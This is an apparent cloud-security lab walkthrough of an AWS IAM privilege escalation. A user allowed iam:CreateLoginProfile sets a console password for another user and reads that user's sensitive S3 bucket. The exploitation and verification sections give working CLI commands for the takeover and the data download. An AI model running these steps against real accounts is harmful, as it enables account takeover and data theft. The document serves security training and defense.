# Guided Walkthrough: One-Hop Privilege Escalation via iam:CreateLoginProfile (to-bucket)

This scenario demonstrates a privilege escalation vulnerability where a user has permission to create login profiles (console passwords) for another IAM user with S3 bucket access. Unlike paths that target administrative privileges, this one focuses on data exfiltration — demonstrating that privilege escalation to sensitive data access can be just as critical as gaining admin rights.

The attacker uses programmatic access credentials with `iam:CreateLoginProfile` permission to create a console password for a target user who already has permissions to access a sensitive S3 bucket. By creating console credentials for this user, the attacker can then log into the AWS Management Console and directly access sensitive data stored in S3. This path illustrates that not all privilege escalation leads to admin access, yet the impact can be equally severe when sensitive data is the target.

## The Challenge

You start as `pl-prod-iam-004-bucket-starting-user`, an IAM user with programmatic credentials (access key and secret). Your only notable permission is `iam:CreateLoginProfile` scoped specifically to the user `pl-prod-iam-004-bucket-hop1`.

That hop1 user already has `s3:GetObject` and `s3:ListBucket` permissions on `pl-sensitive-data-iam-004-{account_id}` — a bucket containing sensitive data. However, hop1 has no console login profile: they can only be used programmatically, and you do not have their credentials.

Your goal is to read the contents of the sensitive S3 bucket.

## Reconnaissance

First, confirm your identity and understand what you're working with.

```bash
aws sts get-caller-identity
```

This confirms you are operating as `pl-prod-iam-004-bucket-starting-user`. Now, check whether the target user already has a console login profile:

```bash
aws iam get-login-profile --user-name pl-prod-iam-004-bucket-hop1
```

If this returns a `NoSuchEntity` error, the user has no console password set — which is exactly the condition that makes this attack possible. You can also enumerate the user's details to understand their permissions:

```bash
aws iam get-user --user-name pl-prod-iam-004-bucket-hop1
aws iam list-user-policies --user-name pl-prod-iam-004-bucket-hop1
aws iam list-attached-user-policies --user-name pl-prod-iam-004-bucket-hop1
```

This reveals the hop1 user's S3 read policies. Now confirm you cannot directly access the bucket as your starting user:

```bash
aws s3 ls s3://pl-sensitive-data-iam-004-{account_id}/
```

This fails with an `AccessDenied` error — your starting user has no S3 permissions at all.

## Exploitation

The exploit is a single API call. You create a console login profile for the hop1 user, setting a password that you control:

```bash
aws iam create-login-profile \
    --user-name pl-prod-iam-004-bucket-hop1 \
    --password 'Attacker1234!' \
    --no-password-reset-required
```

The `--no-password-reset-required` flag is important: without it, the hop1 user would be forced to change their password on first login, which would require knowing the old password.

Wait about 15 seconds for IAM changes to propagate, then confirm the profile was created:

```bash
aws iam get-login-profile --user-name pl-prod-iam-004-bucket-hop1
```

## Verification

Now log into the AWS Management Console using the hop1 user's credentials:

1. Navigate to `https://{account_id}.signin.aws.amazon.com/console`
2. Username: `pl-prod-iam-004-bucket-hop1`
3. Password: `Attacker1234!`

Once logged in, navigate to S3 and browse the `pl-sensitive-data-iam-004-{account_id}` bucket. You can read and download any objects in the bucket.

Alternatively, if you generate programmatic credentials for the hop1 user (through a separate `iam:CreateAccessKey` call, if you had that permission), you could use the CLI:

```bash
aws s3 ls s3://pl-sensitive-data-iam-004-{account_id}/
aws s3 cp s3://pl-sensitive-data-iam-004-{account_id}/sensitive-data.txt .
```

## What Happened

You started with a single IAM permission — `iam:CreateLoginProfile` on a specific user — and used it to bootstrap console access for that user. Because the hop1 user already had S3 read permissions, gaining the ability to authenticate as them was sufficient to reach the sensitive data.

This pattern appears regularly in real environments where teams use least-privilege policies for day-to-day work but leave identity management permissions (like `iam:CreateLoginProfile`) insufficiently scoped. Security tooling that only tracks paths to administrative roles will miss this class of vulnerability entirely. Any user with access to sensitive data is a meaningful escalation target, not just administrators.
